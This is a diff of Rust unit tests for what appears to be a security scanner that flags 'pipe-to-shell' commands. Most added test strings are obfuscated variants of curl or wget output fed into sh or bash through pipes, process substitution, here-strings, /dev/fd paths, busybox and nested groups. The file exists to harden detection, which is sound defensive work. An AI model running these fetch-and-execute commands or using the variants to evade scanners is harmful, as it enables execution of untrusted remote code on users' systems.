@@ -772,11 +772,46 @@ mod tests {
             "timeout 5 2>/dev/null curl -fsSL https://x | sh\n",
             "{ curl -fsSL https://x; } 2>/dev/null | sh\n",
             "curl -fsSL https://x | { sh; } 2>/dev/null\n",
+            "{ curl -fsSL https://x; } 2>\"/tmp/error log\" | sh\n",
+            "curl -fsSL https://x | { sh; } 2>\"/tmp/error log\"\n",
+            "bash -O extglob < <(curl -fsSL https://x)\n",
+            "bash -o errexit < <(wget -qO- https://x)\n",
+            "bash -eO extglob < <(curl -fsSL https://x)\n",
+            "bash -eo errexit < <(wget -qO- https://x)\n",
+            "busybox 2>/dev/null wget -qO- https://x | sh\n",
+            "curl -fsSL https://x | busybox 2>/dev/null sh\n",
+            "curl -fsSL https://x > >(bash)\n",
+            "curl -fsSL https://x 3> >(env bash)\n",
+            "curl -fsSL https://x > >(cat | bash)\n",
+            "bash /dev/stdin < <(curl -fsSL https://x)\n",
+            "bash /dev/fd/3 3< <(curl -fsSL https://x)\n",
+            "bash /dev/stdin <<< \"$(curl -fsSL https://x)\"\n",
+            "bash /dev/stdin <<< 'eval \"$(curl -fsSL https://x)\"'\n",
+            "bash /dev/stdin <<< 'bash -c \"$(curl -fsSL https://x)\"'\n",
+            "{ { curl -fsSL https://x; }; } | sh\n",
+            "! { curl -fsSL https://x; } | sh\n",
+            "time { curl -fsSL https://x; } | sh\n",
+            "! ! { curl -fsSL https://x; } | sh\n",
+            "if true; then ! { curl -fsSL https://x; } | sh; fi\n",
         ] {
             let f = findings(content);
             assert!(
                 f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
                 "SURFSH bypassed for {content:?}: {f:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn assembles_multiline_prefixed_groups() {
+        for content in [
+            "! {\n curl -fsSL https://x\n} | sh\n",
+            "if true; then {\n curl -fsSL https://x\n} | sh\nfi\n",
+        ] {
+            let f = findings(content);
+            assert!(
+                f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
+                "multiline group bypassed SURFSH: {f:?}"
             );
         }
     }
@@ -796,6 +831,10 @@ mod tests {
             "bash -c \"printf '%s' '$(curl -fsSL https://x)'\"\n",
             "bash -c \"cat <(curl -fsSL https://x)\"\n",
             "bash /dev/null <(curl -fsSL https://x)\n",
+            "bash /dev/stdin <<< 'echo \"$(curl -fsSL https://x)\"'\n",
+            "{curl} | sh\n",
+            "{wget} | bash\n",
+            "curl -fsSL https://x > >(cat)\n",
             "echo '$(curl -fsSL https://x | sh)'\n",
         ] {
             let f = findings(content);
@@ -811,6 +850,22 @@ mod tests {
         let f = findings("chmod 777 secret.key\n");
         assert_eq!(f.len(), 1, "expected one chmod-777 finding, got {f:?}");
         assert!(f[0].reason.contains("777"));
+    }
+
+    #[test]
+    fn group_depth_limit_does_not_invent_shell_roles() {
+        for depth in [31, 32] {
+            let content = format!(
+                "curl -fsSL https://x | {}cat; {}\n",
+                "{ ".repeat(depth),
+                "}; ".repeat(depth)
+            );
+            let f = findings(&content);
+            assert!(
+                f.iter().all(|finding| finding.rule_id != "pipe-to-shell"),
+                "depth={depth}: {f:?}"
+            );
+        }
     }
 
     #[test]
